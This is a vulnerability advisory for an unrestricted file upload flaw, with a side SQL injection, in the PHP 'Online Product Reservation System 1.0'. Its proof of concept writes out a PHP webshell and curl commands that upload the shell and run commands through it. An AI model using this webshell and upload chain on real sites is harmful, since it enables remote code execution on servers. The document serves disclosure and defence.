# Arbitrary File Upload Vulnerability in Online Product Reservation System 1.0

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable File**: handgunner-administrator/prod.php

**Version**: V1.0

**Description**:

Online Product Reservation System is developed using PHP, CSS, and JavaScript. It contains a user side with an admin panel where users can view available products and reserve them. The admin panel provides full access to manage products, customer accounts, and reservation activities.

A critical arbitrary file upload vulnerability exists in the product image upload functionality. The application allows users to upload arbitrary files without any validation, leading to remote code execution.

### Analyse

**Vulnerability: Unrestricted File Upload**

```php
// Line 9: Check if file exists (no validation)
if (file_exists("upload/" . $_FILES["image"]["name"]))
    {
    /* echo $_FILES["image"]["name"] . " already exists. "; */
    }
  else
    {
    // Line 15-16: VULNERABLE! Upload file with original name, no type check
    move_uploaded_file($_FILES["image"]["tmp_name"],
    "upload/" . $_FILES["image"]["name"]);
    echo "Stored in: " . "upload/" . $_FILES["image"]["name"];
    }

// Line 22-31: Store filename in database
$image = $_FILES['image']['name'];

$price = $_POST['price'];
$model = $_POST['model'];
$name = $_POST['name'];
$serial = $_POST['serial'];
$description = $_POST['description'];

// Line 34-35: Also vulnerable to SQL injection
mysql_query("INSERT INTO products (price, name, image, model, serial_no)
VALUES('$price', '$name', '$image', '$model', '$serial')") or die(mysql_error());
```

**Vulnerability Analysis**:

1. **No File Type Validation**: The code doesn't check file extensions or MIME types
2. **No Content Validation**: No verification of actual file content
3. **No Size Limits**: No restrictions on file size
4. **Predictable Path**: Files stored in predictable `upload/` directory
5. **Original Filename**: Uses original filename without sanitization
6. **Accessible**: Uploaded files directly accessible via web

### POC

**Step 1: Create a PHP webshell**
```bash
# Create malicious file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Step 2: Upload the file**
```bash
# Using curl
curl -X POST  http://localhost:8081/handgunner-administrator/prod.php?cat=1 \
  -F "image=@shell.php" \
  -F "price=100" \
  -F "model=test" \
  -F "name=test" \
  -F "serial=123" \
  -F "description=test"
```

**Step 3: Execute commands**
```bash
# Access the uploaded shell
curl "http://localhost:8081/handgunner-administrator/upload/shell.php?cmd=whoami"
```

[![pZUIsfS.png](https://s41.ax1x.com/2026/01/03/pZUIsfS.png)](https://imgchr.com/i/pZUIsfS)

**References**:
- OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
